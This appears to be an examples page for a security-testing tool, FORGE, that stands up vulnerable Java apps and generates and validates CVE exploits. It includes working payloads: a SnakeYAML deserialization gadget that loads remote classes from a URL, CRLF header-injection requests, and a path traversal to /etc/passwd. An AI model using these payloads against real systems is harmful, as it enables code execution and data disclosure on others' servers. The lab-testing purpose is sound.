# Examples

Real-world vulnerability scenarios demonstrating FORGE's capabilities.

## Quick reference

| Vulnerability Type | Package | CVE | Framework |
| --- | --- | --- | --- |
| Deserialization | `org.yaml:snakeyaml` | CVE-2022-1471 | Spring Boot |
| JSON Processing | `com.fasterxml.jackson.core:jackson-databind` | CVE-2020-36518 | Spring Boot |
| XML External Entity | `org.dom4j:dom4j` | CVE-2020-10683 | Spring Boot |
| Remote Code Execution | `org.apache.struts:struts2-core` | CVE-2021-31805 | Apache Struts |
| Server-Side Template | `org.springframework:spring-expression` | CVE-2022-22963 | Spring Boot |

## YAML deserialization (SnakeYAML)

**CVE-2022-1471**: SnakeYAML's `Constructor` class allows arbitrary code execution via deserialization of untrusted YAML data.

```bash
python src/main.py workflow -p org.yaml:snakeyaml --limit 1 --auto-run --validate
```

Manual testing:

```bash
# Safe payload
curl -X POST http://localhost:8086/api/vulnerable \
  -H "Content-Type: text/plain" \
  -d "name: John Doe"

# Malicious payload (triggers ScriptEngineManager instantiation)
curl -X POST http://localhost:8086/api/vulnerable \
  -H "Content-Type: text/plain" \
  -d "payload: !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://127.0.0.1:8000\"]]]]"
```

View artifacts:

```bash
ls data/exploit_scripts/CVE-2022-1471_*
python3 data/exploit_scripts/CVE-2022-1471_snakeyaml_exploit.py http://localhost:8086
cat data/monitoring/validation_results/<blueprint-id>_*_validation.json
```

Example validation result:

```json
{
  "cve_id": "CVE-2022-1471",
  "vulnerability_triggered": true,
  "confidence_score": 0.8,
  "detected_impacts": [
    "HTTP Response Body: Successfully deserialized: {payload=javax.script.ScriptEngineManager@291ea515}",
    "Object created: javax.script.ScriptEngineManager"
  ]
}
```

## Jackson Databind deserialization

**CVE-2020-36518**: Polymorphic deserialization leading to RCE through gadget chains.

```bash
python src/main.py workflow \
  -p com.fasterxml.jackson.core:jackson-databind \
  --limit 1 --auto-run --validate --framework-type spring-boot
```

```bash
curl -X POST http://localhost:8087/api/vulnerable \
  -H "Content-Type: application/json" \
  -d '{"@class": "java.util.HashMap", "name": "test", "value": "payload"}'
```

Generated exploit scripts follow this structure:

```python
import urllib.request
import urllib.parse
import sys

class VulnerabilityTester:
    def __init__(self, base_url):
        self.base_url = base_url.rstrip('/')
        self.timeout = 30

    def test_vulnerability(self):
        url = urllib.parse.urljoin(self.base_url, "/api/vulnerable")
        payload = '{"@type": "java.util.HashMap", "data": "test"}'
        req = urllib.request.Request(
            url, data=payload.encode('utf-8'),
            headers={"Content-Type": "application/json"}, method='POST'
        )
        with urllib.request.urlopen(req, timeout=self.timeout) as response:
            result = response.read().decode('utf-8')
            return any(ind in result for ind in
                       ["Successfully deserialized", "HashMap", "Vulnerability triggered"])

if __name__ == "__main__":
    tester = VulnerabilityTester(sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8080")
    sys.exit(0 if tester.test_vulnerability() else 1)
```

## HTTP response splitting (Spring Framework RFD)

**GHSA-6r3c-xf4w-jxjm (CWE-113)**: CRLF injection into HTTP response headers via unsanitized `Content-Disposition` filename.

This is a header-based vulnerability -- validation must inspect response **headers**, not the body.

```bash
python src/main.py workflow \
  -p org.springframework:spring-web \
  --cve-ids org.springframework:spring-web:GHSA-6r3c-xf4w-jxjm \
  --framework-type spring-boot --limit 1 --auto-run --validate
```

Manual testing:

```bash
curl -I "http://localhost:8085/download?filename=test.txt"
curl -I "http://localhost:8085/download?filename=malicious%0A%0DContent-Disposition:%20attachment;filename=evil.exe"
curl -v "http://localhost:8085/download?filename=test%0Amalicious:header" 2>&1 | grep "Content-Disposition"
```

The generated exploit script checks headers:

```python
def check_vulnerability_indicators(self, response_obj):
    content_disp = response_obj.headers.get('Content-Disposition', '')

    # Check for injected header
    if 'X-Malicious-Header' in response_obj.headers:
        return True

    # Check Content-Disposition for CRLF sequences
    return any([
        "%0A" in content_disp,
        "%0D" in content_disp,
        "\\r" in content_disp,
        "\\n" in content_disp,
    ])
```

## Understanding LLM validation: triggered vs exploited

**CVE-2024-53677**: Apache Struts path traversal. This example illustrates how FORGE's LLM validation distinguishes a *triggered* vulnerability from a *fully exploited* one.

```bash
python src/main.py workflow -p org.apache.struts:struts2-core \
  --cve-ids org.apache.struts:struts2-core:CVE-2024-53677 \
  --auto-run --validate --limit 1
```

Scenario: the exploit sends `../../../../etc/passwd` as a filename. The application response:

```text
Error uploading file: uploads/../../../../etc/passwd (Permission denied)
```

A naive validator sees "Permission denied" and reports failure. FORGE's LLM validation correctly identifies that:

1. The application accepted the traversal path without validation (vulnerable)
2. The OS blocked the file write (environmental protection, not app security)
3. The vulnerability was **triggered** even though exploitation was blocked

```json
{
  "vulnerability_demonstrated": true,
  "confidence_score": 0.90,
  "reasoning": "The application accepted the directory traversal path without validation. The 'Permission denied' error occurred at the OS level, not from application input validation."
}
```

This reduces false negatives and gives security teams a clear picture of which layer provides the actual protection.

## Batch processing

```bash
# Multiple packages
python src/main.py workflow \
  -p "org.yaml:snakeyaml,com.fasterxml.jackson.core:jackson-databind,org.springframework:spring-expression" \
  --limit 2 --auto-run --background

# Monitor containers
podman ps --format "table {{.Names}}\t{{.Ports}}\t{{.Status}}"

# Validate all deployments
for container in $(podman ps --format "{{.Names}}" | grep vulnapp); do
  port=$(podman port $container | cut -d: -f2)
  echo "Testing $container on port $port"
  curl -s http://localhost:$port/ | head -1
done
```

## Viewing results

```bash
cat data/monitoring/validation_results/*_validation.json
cat data/monitoring/exploit_reports/*_report.md
tail -f data/monitoring/container_logs/*.log
```

## Container management

```bash
podman ps --format "table {{.Names}}\t{{.Ports}}\t{{.Status}}"
python src/main.py stop-all
podman stats --no-stream
```
